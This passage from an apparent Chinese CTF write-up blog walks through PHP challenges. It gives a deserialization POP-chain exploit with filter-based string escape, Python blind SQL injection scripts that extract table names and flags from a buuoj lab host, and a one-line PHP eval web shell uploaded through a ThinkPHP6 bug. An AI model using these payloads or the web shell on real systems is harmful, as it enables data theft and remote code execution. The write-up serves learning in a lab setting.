<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])&amp;&amp;<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">        $mysqli=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id=$mysqli-&gt;login(<span class="string">'select id,password from user where username=?'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;id)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'id'</span>]=<span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你的ID是"</span>.$_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"你好！"</span>.$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;script&gt;window.location.href='./update.php'&lt;/script&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;id;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">        $age=$Info-&gt;age;</span><br><span class="line">        $nickname=$Info-&gt;nickname;</span><br><span class="line">        $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">        <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">        $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">        <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;nickname);<span class="comment">//危</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;update(<span class="keyword">$this</span>-&gt;age);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"0-0"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age=$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname=$nickname;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$argument)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;CtrlCase-&gt;login($argument[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($newInfo,$sql)</span></span>&#123;</span><br><span class="line">        $newInfo=unserialize($newInfo);</span><br><span class="line">        $upDate=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name=$_POST[<span class="string">'username'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$_POST[<span class="string">'password'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=$_SESSION[<span class="string">'token'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mysqli=<span class="keyword">new</span> mysqli(<span class="keyword">$this</span>-&gt;hostname, <span class="keyword">$this</span>-&gt;dbuser, <span class="keyword">$this</span>-&gt;dbpass, <span class="keyword">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"连接失败，错误:"</span> . <span class="keyword">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        $result=<span class="keyword">$this</span>-&gt;mysqli-&gt;prepare($sql);</span><br><span class="line">        $result-&gt;bind_param(<span class="string">'s'</span>, <span class="keyword">$this</span>-&gt;name);</span><br><span class="line">        $result-&gt;execute();</span><br><span class="line">        $result-&gt;bind_result($idResult, $passwordResult);</span><br><span class="line">        $result-&gt;fetch();</span><br><span class="line">        $result-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="string">'admin'</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> $idResult;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!$idResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'用户不存在!'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="keyword">$this</span>-&gt;password)!==$passwordResult) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'密码错误！'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'token'</span>]=<span class="keyword">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> $idResult;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($sql)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//还没来得及写</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>其中在<code>update.php</code>中我们可以看到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'login'</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">	<span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>并且在寻找反序列化的触发点时，我们选择<code>update.php</code></p>
<p>原因是<code>login.php</code>相对于<code>update.php</code>作为注入点要困难许多。<code>update.php</code>中就算<code>$_SESSION[&#39;login&#39;]!=1</code>，后续的代码依旧会执行。</p>
<p>要如何触发反序列化呢？</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$users=<span class="keyword">new</span> User();</span><br><span class="line">$users-&gt;update();</span><br></pre></td></tr></table></figure>

<p>跟进<code>update.php</code>中的这行代码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $Info=unserialize(<span class="keyword">$this</span>-&gt;getNewinfo());</span><br><span class="line">    $age=$Info-&gt;age;</span><br><span class="line">    $nickname=$Info-&gt;nickname;</span><br><span class="line">    $updateAction=<span class="keyword">new</span> UpdateHelper($_SESSION[<span class="string">'id'</span>],$Info,<span class="string">"update user SET age=$age,nickname=$nickname where id="</span>.$_SESSION[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="comment">//这个功能还没有写完 先占坑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后看到<code>$this-&gt;getNewinfo()</code>，跟进</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNewInfo</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $age=$_POST[<span class="string">'age'</span>];</span><br><span class="line">    $nickname=$_POST[<span class="string">'nickname'</span>];</span><br><span class="line">    <span class="keyword">return</span> safe(serialize(<span class="keyword">new</span> Info($age,$nickname)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>return safe(serialize(new Info($age,$nickname))</code>，会将POST方法传入作为类<code>info</code>的实例进行序列化，再经过<code>safe</code>函数，把黑名单中的内容替换成<code>hack</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">safe</span><span class="params">($parm)</span></span>&#123;</span><br><span class="line">    $array= <span class="keyword">array</span>(<span class="string">'union'</span>,<span class="string">'regexp'</span>,<span class="string">'load'</span>,<span class="string">'into'</span>,<span class="string">'flag'</span>,<span class="string">'file'</span>,<span class="string">'insert'</span>,<span class="string">"'"</span>,<span class="string">'\\'</span>,<span class="string">"*"</span>,<span class="string">"alter"</span>);</span><br><span class="line">    <span class="keyword">return</span> str_replace($array,<span class="string">'hacker'</span>,$parm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>返回的值在<code>getNewInfo()</code>中发生反序列化，这时候将会触发反序列化漏洞。</p>
<p>然后就是构造POP链</p>
<p><img src="/.com//3.png" alt="image-20200316234544047"></p>
<p>然后构造POP的exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $age=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $CtrlCase;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($age,$nickname)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname = $nickname;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">UpdateHelper</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $id;</span><br><span class="line">    <span class="keyword">public</span> $newinfo;</span><br><span class="line">    <span class="keyword">public</span> $sql;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hostname=<span class="string">"127.0.0.1"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbuser=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $dbpass=<span class="string">"root"</span>;</span><br><span class="line">    <span class="keyword">public</span> $database=<span class="string">"test"</span>;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> $mysqli;</span><br><span class="line">    <span class="keyword">public</span> $token = <span class="string">"admin"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$db = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$info = <span class="keyword">new</span> Info(<span class="string">""</span>,<span class="string">"1"</span>);</span><br><span class="line">$updatehelper = <span class="keyword">new</span> UpdateHelper(<span class="string">""</span>,<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line">$updatehelper-&gt;sql = $user;</span><br><span class="line">$user-&gt;nickname = $info;</span><br><span class="line">$user-&gt;age = <span class="string">"select password,id from user where username=?"</span>;</span><br><span class="line">$info-&gt;CtrlCase = $db;</span><br><span class="line"></span><br><span class="line">$c = <span class="string">'";s:8:"CtrlCase";'</span> . serialize($updatehelper) . <span class="string">"&#125;"</span>;</span><br><span class="line">$length = strlen($c);</span><br><span class="line">$c = str_repeat(<span class="string">'union'</span>, $length).$c;</span><br><span class="line"><span class="keyword">echo</span>($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里参考文章：</p>
<p><a href="https://blog.csdn.net/weixin_43610673/article/details/104549353" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43610673/article/details/104549353</a></p>
<p><a href="https://www.anquanke.com/post/id/200200#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200200#h2-0</a></p>
<p>关于字符串逃逸，可以参考<a href="https://blog.csdn.net/zz_Caleb/article/details/96777110" target="_blank" rel="noopener">2016年 0CTF piapiapia</a></p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考点：过滤，布尔盲注，<code>infomation_schema</code>过滤。</p>
<p>测试一下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span>||<span class="number">1</span>=<span class="number">1</span><span class="comment">#    #Nu1L</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span>||<span class="number">1</span>=<span class="number">2</span><span class="comment">#    #Error Occured When Fetch Result.</span></span><br></pre></td></tr></table></figure>





<p>这题过滤了<code>and,or,union select</code>等关键字，盲注数据库：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">0</span>||ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">97</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>



<p>本题中过滤了<code>information_schema</code>,<code>innoDB</code></p>
<p><code>sys.schema_auto_increment_columns</code>和<code>mysql.innodb_table_stats</code> 都不能使用。</p>
<p>所以这里参考：<a href="https://www.anquanke.com/post/id/193512#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/193512#h3-2</a></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">url = <span class="string">"http://64e00aed-6f20-4bf2-a2c4-1c33239893ae.node3.buuoj.cn"</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload</span><span class="params">(i,j)</span>:</span></span><br><span class="line">    data=&#123;<span class="string">'id'</span>:<span class="string">'0||ascii(substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer),%d,1))&gt;%d#'</span>%(i,j)&#125;</span><br><span class="line">    r = requests.post(url,data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Nu1L"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        res = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>) :</span><br><span class="line">        print(i,<span class="string">':'</span>)</span><br><span class="line">        low = <span class="number">31</span></span><br><span class="line">        high = <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high :</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            res = payload(i,mid)</span><br><span class="line">            <span class="keyword">if</span> res :</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span> :</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">        f = int((low + high + <span class="number">1</span>)) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="number">127</span> <span class="keyword">or</span> f == <span class="number">31</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># print (f)</span></span><br><span class="line">        flag += chr(f)</span><br><span class="line">        print(flag)</span><br><span class="line"> </span><br><span class="line">exp()</span><br><span class="line">print(<span class="string">'flag='</span>,flag)</span><br></pre></td></tr></table></figure>

<p>爆出表名为：<code>f1ag_1s_h3r3_hhhhh</code></p>
<p>无列名注入，使用的方法如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select <span class="number">1</span>,<span class="number">0x61</span>)&gt;(select * from f1ag_1s_h3r3_hhhhh limit <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>参考：<a href="https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2" target="_blank" rel="noopener">https://blog.csdn.net/qq_42181428/article/details/104474414?fps=1&amp;locationNum=2</a></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://64e00aed-6f20-4bf2-a2c4-1c33239893ae.node3.buuoj.cn"</span></span><br><span class="line">flag = <span class="string">"0x666c61677b"</span><span class="comment">#flag&#123;</span></span><br><span class="line">f = <span class="string">"flag&#123;"</span></span><br><span class="line">s = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">"1^((select 1,"</span>+flag+j.encode(<span class="string">'hex'</span>)+<span class="string">")&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))^1"</span></span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">"id"</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Nu1L"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">if</span> chr(ord(j)<span class="number">-1</span>) <span class="keyword">in</span> s:</span><br><span class="line">                f = f + chr(ord(j)<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">elif</span> (ord(j)<span class="number">-1</span>) == <span class="number">96</span>:</span><br><span class="line">                f = f + <span class="string">'9'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                f = f + <span class="string">'-'</span></span><br><span class="line">            <span class="keyword">print</span> f</span><br><span class="line">            flag = <span class="string">"0x"</span> + f.encode(<span class="string">'hex'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



<p>另外盲猜列名问<code>flag</code>也是可以的…..</p>
<h2 id="GYCTF2020-EasyThinking"><a href="#GYCTF2020-EasyThinking" class="headerlink" title="[GYCTF2020]EasyThinking"></a>[GYCTF2020]EasyThinking</h2><p>考点：thinkphp6任意文件读取漏洞</p>
<p>前期考察的是<code>thinkphp6文件上传漏洞</code>，访问<code>wwww.zip</code>获得源码</p>
<p>然后就可以尝试一下tp6的漏洞了，先注册一个账号，在搜索页面可以触发这个漏洞。</p>
<p><img src="/.com//4.png" alt></p>
<p>然后可以上传shell了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[value]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后我们接着看一下<code>disable_function</code></p>
